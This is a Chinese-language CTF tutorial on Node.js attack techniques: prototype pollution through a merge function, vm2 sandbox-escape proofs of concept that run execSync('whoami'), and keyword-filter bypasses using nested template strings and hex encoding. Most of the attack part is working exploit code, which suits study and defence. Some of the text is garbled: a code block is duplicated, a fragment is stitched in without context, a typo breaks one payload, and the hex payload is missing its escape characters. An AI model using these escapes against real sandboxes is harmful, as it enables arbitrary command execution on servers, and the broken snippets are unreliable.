#### nodejs中的漏洞技巧
#### 关于原型链
在javascript中，继承的整个过程就称为该类的原型链。
每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，一直到null为止。
在javascript中一切皆对象，因为所有的变量，函数，数组，对象
都始于object的原型即`object.prototype`，但只有类有对象，对象没有，对象有的是`__proto__`。
like:
日期时：
`f -> Data.prototype -> object.prototype->null`
函数时：
`d -> function.prototype -> object.prototype->null`
数组时：
`c -> array.prototype -> object.prototype->null`
类时：
`b -> a.prototype -> object.prototype->null`
当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向`null`，如果此时还没有搜索到，就会返回
`undefined`。
根据上图可知，访问`f1`原型的三种方式：
    console.log(f1["__proto__"])
    console.log(f1.__proto__)
    console.log(f1.constructor.prototype)   #这样可以看出对象的__proto__属性，指向类的原型对象prototype
而访问到函数的方式则为：
    console.log(f1.constructor.constructor)  #这样我们就获取到了Function,可以构造出匿名函数来进行命令执行了。
#### 关于merge函数
在`js`当中如果存在使用`merge`函数或`clone`函数的情况下，可能会产生原型链污染。
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
`merge`函数首先迭代第二个对象b上的所有属性(因为在相同的键值对的情况下，第二个对象是优先的)。  
如果属性同时存在于第一个和第二个参数上，并且它们都是`Object`类型，那么`Merge`函数将重新开始合并它。
在这里可以控制`b[attr]`的值，将`attr`设为`__proto__`，也可以控制b中`proto`属性内的值，那当递归时，`a[attr]`在某个点实际上将指向对象a的原型，至此通过递归我们向所有对象添加一个新属性。
需要配合`JSON.parse`使得我们输入的`__proto__`被解析成键名，JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，否则它只会被当作当前对象的”原型“而不会向上影响
    >let o2 = {a: 1, "__proto__": {b: 2}}
    >merge({}, o2)
    o2.__proto__
    console.log({}.b)
    let o3 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    >merge({},o3)
    console.log({}.b)
     const cmd = new vm.Script("this.constructor.constructor('return this.process.config')()");  (vm1)
     let vm = new VM()  (vm2)-->  const context = vm.createContext(sandbox) (vm1)
     vm.run(script) (vm2) -->   dir = cmd.runInContext(context)  (vm1)
对于第二步，在其中就是创建了一个沙箱环境：
    1. 调用vm.createContext创建上下文context
    2. 调用lib目录下的sandbox.js对其进行封装，生成一个匿名函数
    3. 将这个匿名函数的this为context
导致我们无法对其造成污染：
追溯在`github`当中可以发现一些绕过的方法：
`Breakout in v3.6.9`:`https://github.com/patriksimek/vm2/issues/186`
`Breakout in v3.8.3`:`https://github.com/patriksimek/vm2/issues/225`
    #Breakout in v3.8.3
    "use strict";
    const {VM} = require('vm2');
    const untrusted = '(' + function(){
        try{
            Buffer.from(new Proxy({}, {
                getOwnPropertyDescriptor(){
                    throw f=>f.constructor("return process")();
                }
            }));
        }catch(e){
            return e(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
        }
    }+')()';
    try{
        console.log(new VM().run(untrusted));
    }catch(x){
        console.log(x);
    }
这里是利用`buffer.from`创建一个代理抛出异常`throw f=>f.constructor("return
process")()`被`vm2`内部代码给捕获，再被`catch`给捕获,此时由于对`() => {}`不正确的处理导致了沙箱的逃逸。
###### hackim-2019
在`vm2`当中，可以通过制造错误，引起外部报错，再捕获外部的报错来判断是否存在`vm2`。
在这里通过报错可以发现，服务器使用了`vm2`.
使用`v3.6.9的poc`：
    "use strict";
    const {VM} = require('vm2');
    const untrusted = `
    var process;
    try{
    Object.defineProperty(Buffer.from(""),"",{
        value:new Proxy({},{
            getPrototypeOf(target){
                if(this.t)
                    throw Buffer.from;
                this.t=true;
                return Object.getPrototypeOf(target);
            }
        })
    });
    }catch(e){
        process = e.constructor("return process")();
    }
    process.mainModule.require("child_process").execSync("whoami").toString()
    `;
    try{
        console.log(new VM().run(untrusted));
    }catch(x){
        console.log(x);
    }
执行命令即可获取`flag`。
#### 关于模板字符串利用
模板字符串（template
string）是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量，而如果在模板字符串中需要使用反引号，则前面要用反斜杠转义，另外在模板字符串中嵌入变量需要将变量名卸载`${}`当中。
利用模板字符串，我们可以生成一种嵌套模板
    `${`${`constructo`}r`}` 拼接完之后可以变为 constructor
    解析的顺序就是： `${`constructor`}`--->constructor
###### HUFUCTF just_escape
在虎符ctf中，就出现了利用模板嵌套来进行绕过,题目用的是`vm2`，利用`poc`就可以执行命令，但是题目过滤了一些关键词，导致`poc`需要进行一些更改，我们十六进制以及`unicode`编码或者就是模板嵌套可以进行绕过。
    (function (){
        TypeError[`${`${`protot`}ype`}`][`${`${`get_proc`}esss`}`] = f=>f[`${`${`construc`}tor`}`](`${`${`return this.proc`}ess`}`)();
        try{
            Object.preventExtensions(Buffer.from(``)).a = 1;
        }catch(e){
            return e[`${`${`get_proc`}ess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
        }
    })()
或者是：
    (function(){TypeError[`x70x72x6fx74x6fx74x79x70x65`][`x67x65x74x5fx70x72x6fx63x65x73x73`] = f=>f[`x63x6fx6ex73x74x72x75x63x74x6fx72`](`x72x65x74x75x72x6ex20x70x72x6fx63x65x73x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`x67x65x74x5fx70x72x6fx63x65x73x73`](()=>{}).mainModule.require((`x63x68x69x6cx64x5fx70x72x6fx63x65x73x73`))[`x65x78x65x63x53x79x6ex63`](`whoami`).toString();}})()
### #